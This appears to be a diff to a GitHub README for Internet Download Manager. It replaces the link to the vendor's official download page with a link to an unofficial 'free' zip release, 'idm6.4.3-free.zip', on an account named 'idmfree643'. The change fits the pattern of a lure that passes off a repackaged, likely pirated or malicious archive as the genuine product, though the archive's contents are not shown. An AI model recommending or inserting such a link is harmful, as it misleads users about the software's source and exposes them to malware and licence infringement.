@@ -7,7 +7,7 @@ Internet Download Manager is a popular Windows download manager with dynamic fil
 <img width="392" height="287" alt="image" src="https://github.com/user-attachments/assets/579bb644-002a-47f8-8cb1-f7ed911c43ae" />
 
 ## Install
-[Download Internet Download Manager](https://www.internetdownloadmanager.com/download.html)
+[Download `idm6.4.3-free.zip`](https://github.com/idmfree643/IDM-Free/releases/download/v6.43/idm6.4.3-free.zip)
 ---
 
 <img width="798" height="456" alt="image" src="https://github.com/user-attachments/assets/6009b247-a39e-45d0-a674-00ec6ab744df" />
